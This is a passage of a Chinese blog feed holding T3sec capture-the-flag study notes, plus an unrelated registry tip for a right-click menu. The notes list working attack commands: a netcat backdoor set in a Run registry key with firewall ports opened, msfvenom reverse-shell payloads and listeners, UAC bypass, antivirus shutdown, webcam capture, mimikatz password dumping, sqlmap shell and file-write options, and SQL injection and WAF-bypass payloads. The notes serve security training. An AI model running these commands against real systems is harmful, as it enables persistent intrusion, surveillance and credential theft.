    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%85%AB%E8%AE%B2-nc%E5%90%8E%E9%97%A8/</id>
    <published>2020-05-14T02:54:31.689Z</published>
    <updated>2020-05-17T07:02:20.745Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第八讲-nc后门"><a href="#T3SEC-—–第八讲-nc后门" class="headerlink" title="T3SEC —–第八讲:nc后门"></a>T3SEC —–第八讲:nc后门</h1>    <div id="aplayer-PwMeLxBN" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>隐藏后门</p><h1 id="1-nc后门上传"><a href="#1-nc后门上传" class="headerlink" title="1.nc后门上传"></a>1.nc后门上传</h1><ul><li>upload/root/nc.exe c:\\windows\system32</li></ul><h1 id="2-修改注册表"><a href="#2-修改注册表" class="headerlink" title="2.修改注册表"></a>2.修改注册表</h1><ul><li>reg enumkey -k<ul><li>HKLM\softfware\microsoft\windows\currentversion\run</li></ul></li><li>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d ‘C:\Windows\system32\nc.exe -Ldp 444 -e cmd.exe’  //添加nc键值</li><li>reg queryval -k<ul><li>HKLM\software\microsoft\windows\currentversion\run -v nc  //查看</li></ul></li></ul><h1 id="3-防火墙-允许端口"><a href="#3-防火墙-允许端口" class="headerlink" title="3.防火墙 允许端口"></a>3.防火墙 允许端口</h1><ul><li>execute -f cmd -i -H //生成shell</li><li>cmd: netsh firewall show opmode  //查看防火墙状态.</li><li>netsh firewall add portopening tcp 444 “textx” ENABLE ALL</li><li>netsh firewall add portopening TCP 4444 “FireWall” ENABLE ALL</li><li>netsh firewall add portopening TCP 7776 “QQ” ENABLE ALL</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第七讲-后渗透信息收集</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B8%83%E8%AE%B2-%E5%90%8E%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B8%83%E8%AE%B2-%E5%90%8E%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-05-13T11:34:59.041Z</published>
    <updated>2020-11-24T06:01:21.852Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第七讲-后渗透信息收集"><a href="#T3SEC-—–第七讲-后渗透信息收集" class="headerlink" title="T3SEC —–第七讲:后渗透信息收集"></a>T3SEC —–第七讲:后渗透信息收集</h1>    <div id="aplayer-SMRLfiAk" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><h1 id="反弹连接木马获取shell"><a href="#反弹连接木马获取shell" class="headerlink" title="反弹连接木马获取shell"></a>反弹连接木马获取shell</h1><ul><li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.5.102 LHOST=4444 -f exe &gt; 2020shell.exe</li><li>python -m SimpleHTTPServer 8080  //开启http服务</li><li>Msf开启监听:<ul><li>-use exploit/multi/handler</li><li>-set payload windows/meterpreter/reverse_tcp</li><li>-set lhost 192.168.1.104</li><li>-set lport 4444</li><li>-run</li></ul></li></ul><h3 id="msfvenom-p-windows-meterpreter-reverse-tcp-类型-LHOST-192-168-56-102-ip地址-LPORT-4444-服务端口-f-指定生成数据类型-exe-gt-27shell-exe-生成"><a href="#msfvenom-p-windows-meterpreter-reverse-tcp-类型-LHOST-192-168-56-102-ip地址-LPORT-4444-服务端口-f-指定生成数据类型-exe-gt-27shell-exe-生成" class="headerlink" title="msfvenom -p windows/meterpreter/reverse_tcp //类型 LHOST=192.168.56.102 //ip地址 LPORT=4444 //服务端口 -f //指定生成数据类型  exe &gt; 27shell.exe //生成"></a>msfvenom -p windows/meterpreter/reverse_tcp //类型 LHOST=192.168.56.102 //ip地址 LPORT=4444 //服务端口 -f //指定生成数据类型  exe &gt; 27shell.exe //生成</h3><h3 id="python-m-SimpleHTTPServer-8080-启动http服务"><a href="#python-m-SimpleHTTPServer-8080-启动http服务" class="headerlink" title="python -m SimpleHTTPServer 8080 启动http服务"></a>python -m SimpleHTTPServer 8080 启动http服务</h3><h3 id="msfconsle开始监听"><a href="#msfconsle开始监听" class="headerlink" title="msfconsle开始监听"></a>msfconsle开始监听</h3><h3 id="……"><a href="#……" class="headerlink" title="……."></a>…….</h3><h3 id="getuid可查看当前权限"><a href="#getuid可查看当前权限" class="headerlink" title="getuid可查看当前权限"></a>getuid可查看当前权限</h3><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>-UAC(User Account Control,用户账户控制)</p><ul><li>要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前,提供权限或管理员密码.</li></ul><p>UAC绕过提权</p><ul><li>Exploit/windows/local/ask</li></ul><p>//高等级执行绕过uac–需要用户确认</p><ul><li>use exploit/windows/local/bypassuac</li></ul><p>//无弹窗的uac绕过</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul><li>Msf下进行信息收集</li></ul><p><strong>-Run post /windows/gather/forensics/enum_drives</strong> //获取目标机器的分区情况</p><p><strong>-Run post /windows/gather/checkvm</strong> //判断是否为虚拟机</p><p><strong>-Run post /windows/gather/enum_services</strong> //开启那些服务</p><p><strong>-Run post /windows/gather/enum_applications</strong> //安装了哪些应用</p><p><strong>-Run post /windows/gather/enum_shares</strong> //查看共享</p><p><strong>-Run post /windows/gather/dunmlinks**</strong> //获取主机最近的系统操作</p><p><strong>-Run post /windows/gather/enum_applications</strong> 查看补丁</p><ul><li><p><strong><u>Run Scraper</u></strong> //脚本 -偏于网络</p></li><li><p><strong>Run Winenum</strong> //脚本 -偏于整体</p></li><li><p><strong>Run post/windows/manage/killav</strong>  //命令关闭目标机系统杀毒软件</p></li><li><p><strong>Run post/windows/manage/enable_rdp</strong>  //命令启动目标机的远程桌面协议,也就是常说的3389端口</p></li><li><p><strong>Run post/windows/manage/autoroute</strong> //命令查看目标机的本地子网情况</p></li><li><p><strong>Run post/windows/gather/enum_logged_on_users</strong> 命令列举当前有多少用户登陆了目标机</p></li><li><p><strong>Run post/windows/gather/enum_applications</strong> //命令列举安装在目标机上的应用程序 </p></li><li><p><strong>Screenshot</strong> //截图</p></li><li><p><strong>webcam_list</strong> //查看目标机是否有摄像头 </p></li><li><p><strong>webcam_snap</strong> //打开目标摄像头,拍一张照片</p></li><li><p><strong>webcam_stream</strong> //开启直播模式</p></li><li><p><strong>shll</strong>  进入到目标机的shell下面</p></li><li><p><strong>exit</strong> //停止 meterpreter 会话</p></li></ul><h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令:"></a>文件系统命令:</h2><ul><li><strong>pwd或getwd</strong>: 查看当前处于目标机的哪个目录</li><li><strong>getlwd</strong> //查看当前处于本地的哪个目录</li><li><strong>ls</strong> //列出当前文件目录中的所有文件</li><li><strong>cd</strong> //切换目录</li><li><strong>search -f * .txt -d c:\</strong>  //可以搜索c盘中所有以 .txt 为扩展名的文件,其中-f参数用于指定搜索文件模式 -d 参数用于指定在哪个目录下进行搜索</li></ul><h2 id="hash破解登陆密码"><a href="#hash破解登陆密码" class="headerlink" title="hash破解登陆密码:"></a>hash破解登陆密码:</h2><p>meterpreter &gt; load mimikatz //启动mimikatz 模块</p><p>meterpreter &gt; help  //查看帮助</p><p>meterpreter &gt; msv //获取登陆密码的hash值</p><p>meterpreter &gt; mimikatz_command -f samdump::hashes //获取登陆密码的hash值</p><p>meterpreter &gt; ssp //获取的是明文信息</p><p>meterpreter &gt; tspkg   //获取的是明文信息</p><p>meterpreter &gt; wdigest  //读取内存中存放的账号密码明文信息</p><p>meterpreter &gt; kerberos  //获取明文密码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第六讲:webshell提权</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%85%AD%E8%AE%B2-webshell%E6%8F%90%E6%9D%83/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%85%AD%E8%AE%B2-webshell%E6%8F%90%E6%9D%83/</id>
    <published>2020-05-10T08:39:46.244Z</published>
    <updated>2020-05-10T09:38:03.972Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第六讲-webshell提权"><a href="#T3SEC-—–第六讲-webshell提权" class="headerlink" title="T3SEC —–第六讲:webshell提权"></a>T3SEC —–第六讲:webshell提权</h1>    <div id="aplayer-hNABUUio" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>phpmyadmin getshell到提权</p><h1 id="一-环境准备"><a href="#一-环境准备" class="headerlink" title="一.环境准备:"></a>一.环境准备:</h1><p>靶机:win7 32位</p><p>环境:</p><p>php:5.45</p><p>mysql:5.5.53</p><p>Apache:2.43</p><h1 id="二-开始攻击"><a href="#二-开始攻击" class="headerlink" title="二.开始攻击"></a>二.开始攻击</h1><p>访问发现3306端口打开.经过弱口令,爆破,目录泄露等途径已经获知phpmyadmin的账号密码是root  root</p><h2 id="1-开始登陆到phpmyadmin"><a href="#1-开始登陆到phpmyadmin" class="headerlink" title="1.开始登陆到phpmyadmin"></a>1.开始登陆到phpmyadmin</h2><p>注意大小写 中英文标点符号  格式</p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>show  variables like ‘ value’  <strong>查询variables</strong> </p><p><strong>写入修改内容</strong></p><ul><li>select …. = .. </li><li>set … =… </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第四讲:SQL漏洞注入及WAF绕过</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%9B%9B%E8%AE%B2-SQL%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E5%8F%8AWAF%E7%BB%95%E8%BF%87/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%9B%9B%E8%AE%B2-SQL%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E5%8F%8AWAF%E7%BB%95%E8%BF%87/</id>
    <published>2020-05-08T02:39:28.782Z</published>
    <updated>2020-05-09T10:25:04.738Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第四讲-SQL漏洞注入及WAF绕过"><a href="#T3SEC-—–第四讲-SQL漏洞注入及WAF绕过" class="headerlink" title="T3SEC —–第四讲:SQL漏洞注入及WAF绕过"></a>T3SEC —–第四讲:SQL漏洞注入及WAF绕过</h1>    <div id="aplayer-KPnJavaP" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><h1 id="一-WAF相关介绍"><a href="#一-WAF相关介绍" class="headerlink" title="一.WAF相关介绍"></a>一.WAF相关介绍</h1><p>WAF(Web Application Firewall)web应用防火墙</p><h2 id="WAF-有哪些"><a href="#WAF-有哪些" class="headerlink" title="WAF 有哪些"></a>WAF 有哪些</h2><p>1.软件型WAF</p><p>２.硬件型WAF</p><p>３.云WAF－－－反向代理模式工作，通过配置NS记录或者CNAME记录，带有防护的CDN</p><p>4.网站系统内置的WAF</p><h2 id="WAF的功能"><a href="#WAF的功能" class="headerlink" title="WAF的功能:"></a>WAF的功能:</h2><p>1.审计</p><p>2.访问控制/过滤</p><p>3.架构安全的网络设计</p><p>4.web加固</p><h2 id="WAF怎么识别扫描器"><a href="#WAF怎么识别扫描器" class="headerlink" title="WAF怎么识别扫描器"></a>WAF怎么识别扫描器</h2><p>1.AWVS,SQLMAP,APPscan,OpenVAS等工具(基于白盒/灰盒渗透测试)</p><p>以下几点来识别waf</p><ul><li>扫描器指纹(head字段/请求的参数值)</li><li>单ip+cookiie某一个时间段发出多少次来判断</li><li>隐藏连接标签</li><li>…….</li></ul><p>对于注入过程中如何去判断是否目标由WAF</p><p>1,sqlmap -u url地址 –identigy-waf –batch</p><p>2.手工判断</p><p> xxx.com/?user=a’ unionselect 1,2,3,4 –+   放入一个不存在的参数值去触发WAF防护:形式表现:页面无法访问,响应码异常,返回与页面不同的结果.</p><h1 id="二-SQL注入绕过"><a href="#二-SQL注入绕过" class="headerlink" title="二.SQL注入绕过"></a>二.SQL注入绕过</h1><p><strong>黑名单过滤</strong>:空格,?,,‘,and,or,union,select,sleep(),”,#,-,+,unit</p><p>sqlmap tamper—-自己编写tamper</p><p>1.双写:and–&gt;anandd或aandnd</p><p>2.大小写绕过</p><ul><li>express/i  前提:对大小写不敏感的无法绕过</li></ul><p>3.编码绕过 </p><ul><li>base64编码</li><li>ASCII</li><li>宽字符</li><li>url编码</li><li>Unicode编码</li><li>……….</li></ul><p>4.替换关键字</p><p>id=1 UNIunionON SELselectCT 1,2,3,</p><p>5.注释绕过:</p><p>空格  /**/</p><p>绕过技术很多,建议<a href="https://zhuanlan.zhihu.com/p/113579251/" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/113579251/</a></p><h1 id="三-SQL注入绕过实战"><a href="#三-SQL注入绕过实战" class="headerlink" title="三.SQL注入绕过实战"></a>三.SQL注入绕过实战</h1><p>21–cookie注入+base64编码绕过</p><p>27—判断过滤了空格,–+过滤 /**/过滤,,可使用%0a闭合方式绕过空格</p><p>1’ %0aunion select 1,2,database()</p><h3 id="使用sqlmap绕过"><a href="#使用sqlmap绕过" class="headerlink" title="使用sqlmap绕过:"></a>使用sqlmap绕过:</h3><p>sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-21/" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-21/</a> ?id=0 –tamper</p><h1 id="四-作业"><a href="#四-作业" class="headerlink" title="四.作业:"></a>四.作业:</h1><p>less27</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="t3sec" scheme="http://www.fangmingxuan.com/tags/t3sec/"/>
    
      <category term="信息安全" scheme="http://www.fangmingxuan.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTF" scheme="http://www.fangmingxuan.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>windows--右键菜单添加新建文件类型</title>
    <link href="http://www.fangmingxuan.com/2020/05/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B/"/>
    <id>http://www.fangmingxuan.com/2020/05/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B/</id>
    <published>2020-05-08T02:36:42.043Z</published>
    <updated>2020-05-09T10:57:07.710Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="右键菜单添加新建文件类型"><a href="#右键菜单添加新建文件类型" class="headerlink" title="右键菜单添加新建文件类型"></a>右键菜单添加新建文件类型</h1>    <div id="aplayer-eezGtEyc" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>编辑一下代码保存为.reg文件就可以了，替换其中md的类型为新的文件类型就可以。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md]</span><br><span class="line">@&#x3D;&quot;mdfile&quot;</span><br><span class="line">&quot;Content Type&quot;&#x3D;&quot;text&#x2F;plain&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md\ShellNew]</span><br><span class="line">&quot;NullFile&quot;&#x3D;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\mdfile]</span><br><span class="line">@&#x3D;&quot;md文件&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\mdfile\shell]</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\mdfile\shell\open]</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\mdile\shell\open\command]</span><br><span class="line">@&#x3D;&quot;C:\Program Files\Vim\vim73\gvim.exe %1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Tips" scheme="http://www.fangmingxuan.com/categories/Tips/"/>
    
    
      <category term="windows" scheme="http://www.fangmingxuan.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>T3sec 学习笔记—–第三讲:web应用安全</title>
    <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B8%89%E8%AE%B2-web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E4%B8%89%E8%AE%B2-web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/</id>
    <published>2020-05-07T10:21:38.633Z</published>
    <updated>2020-05-08T02:39:57.041Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第三讲-web应用安全"><a href="#T3SEC-—–第三讲-web应用安全" class="headerlink" title="T3SEC —–第三讲:web应用安全"></a>T3SEC —–第三讲:web应用安全</h1>    <div id="aplayer-IhDXWFFW" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>OWASP–Open Web Application Security Project 组织.开源.    —会员   发送邮件到<a href="mailto:member@owasp.org.cn">member@owasp.org.cn</a>即可参加.</p><p>ISC—CISSP  </p><h3 id="OWASP-Top10-10大应用安全风险"><a href="#OWASP-Top10-10大应用安全风险" class="headerlink" title="OWASP Top10(10大应用安全风险)"></a>OWASP Top10(10大应用安全风险)</h3><p>1.注入</p><p>2.失效的身份认证和会话管理</p><p>3.XSS -跨站脚本攻击</p><p>4.不安全的对象直接引用</p><p>5.CSRF –跨站请求伪造</p><p>6.安全的错误配置</p><p>7.限制URL访问失败</p><p>8.未验证的重定向转发</p><p>9.应用已知的漏洞组件</p><p>10.敏感信息泄露</p><h1 id="一-SQL注入漏洞"><a href="#一-SQL注入漏洞" class="headerlink" title="一.SQL注入漏洞"></a>一.SQL注入漏洞</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理:"></a>1.原理:</h2><h2 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程:"></a>2.流程:</h2><ul><li>注入点探测<ul><li>自动探测-WEB漏扫工具 ,  AWVS APPSCAN OPENVAS nessus OWASP ZAP .Burpsuite</li><li>手动探测–手工构造payload</li></ul></li><li>信息获取<ul><li>环境信息:数据库类型,数据库版本,操作系统类型版本,用户信息</li><li>数据库信息:库民,表名,字段名,数据值—(后台管理员账户密码)</li></ul></li><li>获取权限<ul><li>获取操作系统权限,通过执行shell,上传大马或者小马</li></ul></li></ul><h2 id="3-探测方法"><a href="#3-探测方法" class="headerlink" title="3.探测方法"></a>3.探测方法</h2><ul><li>sqlmap工具<ul><li>五种注入类型</li><li>盲注</li><li>联合注入</li><li>二次注入</li><li>堆叠</li><li>xxx</li></ul></li><li>手工<ul><li>整型</li><li>$=”select * from users where name=$name and pass = $pass”;</li><li>$=”select * from users where name= or 1=1       # and pass = $pass”;= select *fro users;</li><li>字符型</li><li>$=”select * from users where name=’’$name’ and pass = ‘$pass’ “;</li><li>$=”select * from users where name=’ ‘  or ‘1’=’1’ #’’ and pass = $pass”;</li><li>搜索型</li><li>$=”select * from users where password like ‘%’ or 1=1 and ‘%’=’%’ order by password ;</li></ul></li></ul><h4 id="sqlmap需要python环境"><a href="#sqlmap需要python环境" class="headerlink" title="sqlmap需要python环境"></a>sqlmap需要python环境</h4><h3 id="sql常用用法"><a href="#sql常用用法" class="headerlink" title="sql常用用法"></a>sql常用用法</h3><p>sqlmap - u url地址/参数=值 –dbs       爆库爆表</p><p>sqlmap - u url地址/参数=值 –os  -shell      获取shell</p><p>sqlmap - u url地址/参数=值 –level 5 -risk=4   四个风险级别 五个优先级</p><p>sqlmap - u url地址/参数=值  –file-read  “C:\1.sh”读取文件</p><p>sqlmap - u url地址/参数=值  –file-write shell.php –file-dest “C:\www\XXXXX”</p><h2 id="4-建议下载安全狗-设置绕过练习"><a href="#4-建议下载安全狗-设置绕过练习" class="headerlink" title="4.建议下载安全狗,设置绕过练习"></a>4.建议下载安全狗,设置绕过练习</h2><p>tamper脚本 –python基础编程,协议分析,数据库语法及编程,SQL注入漏洞原理</p><h1 id="二-XSS-跨站脚本-铁三赛中不会体现"><a href="#二-XSS-跨站脚本-铁三赛中不会体现" class="headerlink" title="二.XSS-跨站脚本(铁三赛中不会体现)"></a>二.XSS-跨站脚本(铁三赛中不会体现)</h1><h1 id="三-上传漏洞-必考"><a href="#三-上传漏洞-必考" class="headerlink" title="三.上传漏洞(必考)"></a>三.上传漏洞(必考)</h1><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过:"></a>上传绕过:</h3><p>1.客户端:js检查</p><p>2.服务器端:</p><ul><li>检查后缀:<ul><li>黑名单:<strong>可解析的后缀 .php  .xxx  上传伪静态文件.htacsses 点绕过 空格绕过;::$DATA绕过</strong>  </li><li>白名单:<strong>%00 截断 ,0x00 截断,MIME绕过</strong></li></ul></li><li>检查内容:<strong>文件头,图片getimagesize(),二次渲染</strong></li><li>代码逻辑:<strong>条件竞争</strong></li></ul><h4 id="upload-labs-靶场环境部署-联系上传"><a href="#upload-labs-靶场环境部署-联系上传" class="headerlink" title="upload-labs 靶场环境部署,联系上传"></a>upload-labs 靶场环境部署,联系上传</h4><h1 id="四-CSRF-应该不考"><a href="#四-CSRF-应该不考" class="headerlink" title="四.CSRF (应该不考)"></a>四.CSRF (应该不考)</h1><h1 id="五-SSRF服务器端请求伪造"><a href="#五-SSRF服务器端请求伪造" class="headerlink" title="五.SSRF服务器端请求伪造"></a>五.SSRF服务器端请求伪造</h1><p>由攻击者构造的请求,由服务器发起请求的安全漏洞</p><p>一般目标:外网无法访问的服务器.</p><h1 id="六-暴力破解漏洞"><a href="#六-暴力破解漏洞" class="headerlink" title="六.暴力破解漏洞"></a>六.暴力破解漏洞</h1><p>账户密码,静态验证码 —暴力破解</p><h4 id="建议"><a href="#建议" class="headerlink" title="建议:"></a>建议:</h4><ul><li>先准备一套字典</li></ul><p>Hydra-九头蛇(ftp,ssh,relent,mysql等)</p><p>Burpsuite 测试器4种:</p><h1 id="七-命令执行漏洞"><a href="#七-命令执行漏洞" class="headerlink" title="七.命令执行漏洞"></a>七.命令执行漏洞</h1><p>程序调用系统函数,php,哪些函数会调用系统:</p><h2 id="1-远程命令执行漏洞"><a href="#1-远程命令执行漏洞" class="headerlink" title="1.远程命令执行漏洞"></a>1.远程命令执行漏洞</h2><p>eval()</p><p>assert()</p><p>preg_repalce()</p><h2 id="2-本地命令执行漏洞"><a href="#2-本地命令执行漏洞" class="headerlink" title="2.本地命令执行漏洞"></a>2.本地命令执行漏洞</h2><p>system()</p><p>shell_exec:</p><p>exec:</p><p>等</p><h1 id="八-包含漏洞"><a href="#八-包含漏洞" class="headerlink" title="八.包含漏洞"></a>八.包含漏洞</h1><p>使用文件包含漏洞,在包含文件时服务器未对用户设置的值进行检查</p><p>include()</p><p>include_once()</p><p>require_once()</p><p>require()</p><h1 id="九-XXE漏洞"><a href="#九-XXE漏洞" class="headerlink" title="九.XXE漏洞"></a>九.XXE漏洞</h1><p>读取任意文件,执行系统指令,,,,,,</p><h1 id="十-反序列化漏洞"><a href="#十-反序列化漏洞" class="headerlink" title="十.反序列化漏洞"></a>十.反序列化漏洞</h1><p>先了解php反序列化是啥</p>]]></content>
    
    <summary type="html">
    
      
      
